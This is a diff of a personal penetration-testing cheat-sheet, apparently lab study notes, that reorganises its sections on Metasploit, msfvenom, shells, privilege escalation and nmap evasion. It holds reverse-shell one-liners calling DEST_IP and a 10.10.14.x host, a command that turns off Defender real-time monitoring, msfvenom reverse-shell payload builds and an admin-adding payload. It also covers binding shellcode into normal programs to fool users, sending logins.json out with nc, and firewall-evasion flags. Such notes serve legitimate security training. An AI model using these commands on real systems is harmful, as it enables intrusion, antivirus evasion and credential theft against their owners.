@@ -2,8 +2,14 @@
 - [Existing Tools](#existing-tools)
 - [Ping and Port Scanning - Ping Sweep](#ping-and-port-scanning---ping-sweep)
 - [Shells](#shells)
+  - [Metasploit](#metasploit)
+  - [MSFvenom](#msfvenom)
+  - [Bypass AV](#bypass-av)
+  - [Meterpreter](#meterpreter)
+  - [Metasploit with database](#metasploit-with-database)
+  - [Stabilizing - spawn shell](#stabilizing---spawn-shell)
+  - [Webshells](#webshells)
 - [PWNCAT-CS](#pwncat-cs)
-- [Stabilizing](#stabilizing)
 - [Privilege Escalation](#privilege-escalation)
   - [shared libraries](#shared-libraries)
   - [capabilities](#capabilities)
@@ -19,10 +25,6 @@
   - [Using HTTPS](#using-https)
 - [Searchexploit](#searchexploit)
 - [Code Analyse](#code-analyse)
-- [METASPLOIT](#metasploit)
-  - [msfvenom](#msfvenom)
-  - [Meterpreter](#meterpreter)
-  - [Metasploit with database](#metasploit-with-database)
 - [Port Scanning (NMAP - DB\_NMAP - Socat)](#port-scanning-nmap---db_nmap---socat)
   - [Firewal Evasion](#firewal-evasion)
   - [Routes](#routes)
@@ -33,6 +35,12 @@
 - [Recover files](#recover-files)
 
 ## BASIC ENUM
+- Questions
+  - Distro
+  - shell/languages available
+  - functin of the system
+  - applications
+  - known vulns
 - User/groups
 - hostnames
 - routing tables
@@ -42,6 +50,8 @@
 - service
 - snmp, dns
 - credentials
+- ping
+  - [Default TTL](https://subinsb.com/default-device-ttl-values/)
 
 ## Existing Tools
 - ls /etc/*release = version, os
@@ -130,8 +140,7 @@ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l $TARGET 1234
 7. nc -l $TARGET 1234 > /tmp/f = send the result to nc, output sent to /tmp/f that uses bbash sehll waiting for the connection
 ```
 
-  - **No NC**:
-
+- **No NC**:
 ```
 bash &>/dev/tcp/DEST_IP/DEST_PORT <&1
 bash -c "bash &>/dev/tcp/DEST_IP/DEST_PORT <&1"
@@ -143,7 +152,8 @@ echo base64encoded== | base64 -d | sh/bash
 
 # Try different shels /bin/bash | sh
 ``` 
-  - **Powershell**
+
+- **Powershell**
 ```
 # Disable antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
@@ -158,6 +168,136 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
   - nc -nlvp PORT ==> TCP listener
   - nc -ulvnp PORT ==> UDP listener
 
+### Metasploit
+- [Community vs Pro](https://www.rapid7.com/products/metasploit/download/editions/) 
+- [Exploits](https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits)
+  - paste: /usr/share/metasploit-framework/modules/exploits
+- msfconsole
+- use exploit/multi/handler
+  - post/multi = post exploitation (generic)
+  - 
+- search
+  - platform:
+  - type:
+  - author:
+  - app:
+  - name
+- show options
+- setg => set global valules
+- unsetg => unset global values
+- background => putting a session in backgrou
+- sessions => display sessions
+- Direct execution
+  - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""
+
+### MSFvenom
+- List payloads
+  - msfvenom -l payloads | encoders | nos | platforms | formats | all
+  - -p payload --list-options
+- Many platforms and formats
+- Example generate hex of payload:
+  - Method 1
+    - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
+  - raw binary file .bin:
+    - binary ==> msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
+  - convert to hex:
+    - xxd -i file.bin ==> generate payload for .c
+  - Creating basic payload
+    - msfvenom -p linux/x64/shell_reverse_tcp LHOST= LPORT -f elf > payload.elf
+    - msfvenom -p  windows/shell_reverse_tcp LHOST= LPORT -f exe > payload.exe
+
+- [Stage vs Stageless](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
+  - stageless: shell_reverse_tcp = one thing only
+  - staged: /shell/reverse_tcp
+
+- Smaller payloads
+  - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**
+
+- Binding
+  - Merge shellcode WITH normal program
+  - Fool users
+  - still can be detected by AVs
+  - Better: encode + encrypt + packers + binder
+
+- Encoding and Encrypting
+  - msfvenom --list encoders / encrpyt
+  - -e encoder_option
+  - -i interation
+
+### Bypass AV
+|                                       Source                                       |
+| :--------------------------------------------------------------------------------: |
+| [MSFVenom & Metasploit-Framework ](https://github.com/rapid7/metasploit-framework) |
+|   [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)   |
+|           [Mythic C2 Framework](https://github.com/its-a-feature/Mythic)           |
+|                 [Nishang](https://github.com/samratashok/nishang)                  |
+|                 [Darkarmour](https://github.com/bats3c/darkarmour)                 |
+
+### Meterpreter
+- sysinfo
+- getpid
+- hashdump (migrate to process first)
+- getpid
+- getpriv
+- migrate PID [try and error, migrating to existing process] + check hashdump
+- search
+
+### Metasploit with database
+- Basic usage
+  - use handler/multi
+  - set payload
+
+1. service postgresql start
+2. service metasploit start
+3. update-rc.d postgresql enable *for performance*
+4. update-rc.d metasploit enable *for performance*
+5. db_rebuild_cache [in msf console] *for performance*
+
+- db_command ==> db_status, db_nmap etc
+
+- workspace -a (add)
+- workspace -d (delete)
+- workspace name (move to name)
+
+### Stabilizing - spawn shell
+- Spawn shells
+  
+```
+# Python
+python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
+python3 -c "import pty;pty.spawn('/bin/bash')"
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+# Perl
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+
+# Ruby
+ruby: exec "/bin/sh"
+
+# Lua
+lua: os.execute('/bin/sh')
+
+# AWK
+awk 'BEGIN {system("/bin/sh")}'
+
+# Find
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+find . -exec /bin/sh \; -quit
+
+# Vim
+vim -c ':!/bin/sh'
+```
+   
+-  export TERM=xterm = commands like clear
+-  ctr + z = back to our shel
+-  stty raw -echo; fg = back to reverse shell
+
+### Webshells
+- browser based
+- [Laudanum shells](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
+- [Nishang](https://github.com/samratashok/nishang)
+
 ## PWNCAT-CS
 - nc with steroids
 - python version => stabilized
@@ -166,14 +306,6 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 - nc.exe -nv 10.9.1.255 1234 < logins.json
 - source pwncat-env/bin/activate
 - pwncat-cs -lp PORT
-
-## Stabilizing
--  python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
--  python3 -c "import pty;pty.spawn('/bin/bash')"
--  python -c 'import pty; pty.spawn("/bin/bash")'
--  export TERM=xterm = commands like clear
--  ctr + z = back to our shel
--  stty raw -echo; fg = back to reverse shell
 
 ## Privilege Escalation
 - https://tryhackme.com/room/introtoshells
@@ -200,7 +332,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
     - find / -writable 2>/dev/null ==> find writable folders
       - sudo -u OWNER file
 
-- sudo -l
+ sudo -l
 - [GTFOBins](https://gtfobins.github.io/gtfobins/find/)
 
 ### shared libraries 
@@ -517,80 +649,6 @@ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
 - snyk --scan-all-unmanaged
   - unpack zip file
 
-## METASPLOIT
-- msfconsole
-- use exploit/multi/handler
-  - post/multi = post exploitation (generic)
-  - 
-- search
-  - platform:
-  - type:
-  - author:
-  - app:
-  - name
-- show options
-- setg => set global valules
-- unsetg => unset global values
-- background => putting a session in backgrou
-- sessions => display sessions
-- Direct execution
-  - msf -q -x "use exploit/path/to; set payload path/to/payload; set optionsName Name; exploit""
-
-### msfvenom
-- Many platforms and formats
-- Example generate hex of payload:
-  - Method 1
-    - msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f c
-  - raw binary file .bin:
-    - binary ==> msfvenom -a x86 --platform windows -p windows/exec cmd=calc.exe -f raw > /tmp/example.bin
-  - convert to hex:
-    - xxd -i file.bin ==> generate payload for .c
-
-- Stage vs Stageless
-  - stageless: shell_reverse_tcp = one thing only
-  - staged: /shell/reverse_tcp
-
-- Smaller payloads
-  - Payload with a single command: **CMD='net user pwnd Password321 /add;net localgroup administrators pwdn /add'**
-
-- Binding
-  - Merge shellcode WITH normal program
-  - Fool users
-  - still can be detected by AVs
-  - Better: encode + encrypt + packers + binder
-
-- Encoding and Encrypting
-  - msfvenom --list encoders / encrpyt
-  - -e encoder_option
-  - -i interation
-
-### Meterpreter
-- sysinfo
-- getpid
-- hashdump (migrate to process first)
-- getpid
-- getpriv
-- migrate PID [try and error, migrating to existing process] + check hashdump
-- search
-
-
-### Metasploit with database
-- Basic usage
-  - use handler/multi
-  - set payload
-
-1. service postgresql start
-2. service metasploit start
-3. update-rc.d postgresql enable *for performance*
-4. update-rc.d metasploit enable *for performance*
-5. db_rebuild_cache [in msf console] *for performance*
-
-- db_command ==> db_status, db_nmap etc
-
-- workspace -a (add)
-- workspace -d (delete)
-- workspace name (move to name)
-
 ## Port Scanning (NMAP - DB_NMAP - Socat)
 - db_nmap (for metasploit) | nmap
 - Scripts
@@ -679,19 +737,19 @@ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
       - -S,-A,-P-U-F-R
 
 ### Summary
-|Approach     |NMAP Command                 |
-|-------------|-----------------------------|
-|Decoy        |-D IP,IP,ME, RND,RND,ME      |
-|Proxy        |--proxies URL,HOST:port      |
-|Spoofed mac  |--spoof-mac MAC              |
-|Spoofed ip   |-S IP                        |
-|Src Port     |-g PORT, --source-port PORT  |
-|Fragment     |-f 8 bytes, -ff 18 bytes     |
-|MTU          |--mtu #                      |
-|Lenght packet|--data-length #              | 
-|TTL          |--ttl #                      |
-|IP options   |-ip-options RTULS            |
-|bad sum      |--badsum                     |
+| Approach      | NMAP Command                |
+| ------------- | --------------------------- |
+| Decoy         | -D IP,IP,ME, RND,RND,ME     |
+| Proxy         | --proxies URL,HOST:port     |
+| Spoofed mac   | --spoof-mac MAC             |
+| Spoofed ip    | -S IP                       |
+| Src Port      | -g PORT, --source-port PORT |
+| Fragment      | -f 8 bytes, -ff 18 bytes    |
+| MTU           | --mtu #                     |
+| Lenght packet | --data-length #             |
+| TTL           | --ttl #                     |
+| IP options    | -ip-options RTULS           |
+| bad sum       | --badsum                    |
 
 - Convert to html
   -  xsltproc input.xml -o output.html
